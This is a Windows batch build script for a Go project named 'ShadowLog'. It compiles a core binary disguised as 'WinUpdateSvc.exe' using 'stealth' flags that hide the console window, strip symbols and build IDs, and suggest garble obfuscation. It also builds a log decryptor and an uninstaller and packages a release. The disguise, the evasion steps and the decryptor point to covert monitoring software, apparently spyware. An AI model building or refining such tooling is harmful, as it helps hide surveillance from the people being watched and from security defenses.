@echo off
setlocal
title System Build

echo ----------------------------------------------------
echo  Build System
echo ----------------------------------------------------

:: Ensure we are in the project root
if not exist main.go (
    echo Error: main.go not found. Please run from the project root.
    pause
    exit /b
)

:: -------------------------------------------------------
:: STEALTH BUILD FLAGS:
::   -H windowsgui     = No console window
::   -s                = Strip symbol table (no function names)
::   -w                = Strip DWARF debug info
::   -buildid=         = Remove Go build ID fingerprint
::   -trimpath          = Remove local filesystem paths from binary
::
:: GARBLE (optional, install with: go install mvdan.cc/garble@latest):
:: -------------------------------------------------------
set LDFLAGS=-s -w -buildid=
set BUILD_CMD=go build

echo.
echo [1/3] Building Core Monitor (WinUpdateSvc.exe)...
echo     Generating manifest resource...
rsrc -manifest WinUpdateSvc.manifest -o WinUpdateSvc.syso
%BUILD_CMD% -trimpath -ldflags "%LDFLAGS% -H windowsgui" -o WinUpdateSvc.exe main.go
if %ERRORLEVEL% NEQ 0 (
    echo Failed to build WinUpdateSvc.exe
    exit /b 1
)

echo [2/3] Building Forensic Decryptor (Decryptor.exe)...
%BUILD_CMD% -trimpath -ldflags "%LDFLAGS%" -o Decryptor.exe decryptor/main.go
if %ERRORLEVEL% NEQ 0 (
    echo Failed to build Decryptor.exe
    exit /b
)

echo [3/3] Building System Uninstaller (Uninstaller.exe)...
%BUILD_CMD% -trimpath -ldflags "%LDFLAGS%" -o Uninstaller.exe uninstaller/main.go
if %ERRORLEVEL% NEQ 0 (
    echo Failed to build Uninstaller.exe
    exit /b
)

echo [4/4] Packaging Release...
if exist ShadowLog_Release.zip del ShadowLog_Release.zip
powershell -Command "Compress-Archive -Path WinUpdateSvc.exe, Decryptor.exe, Uninstaller.exe, README.md -DestinationPath ShadowLog_Release.zip"
if %ERRORLEVEL% NEQ 0 (
    echo Failed to create ShadowLog_Release.zip
    exit /b
)

echo.
echo ----------------------------------------------------
echo Build Complete: All binaries generated successfully.
echo - WinUpdateSvc.exe    (Core)
echo - Decryptor.exe       (Forensics)
echo - Uninstaller.exe     (Cleanup)
echo - ShadowLog_Release.zip
echo ----------------------------------------------------
echo.
pause
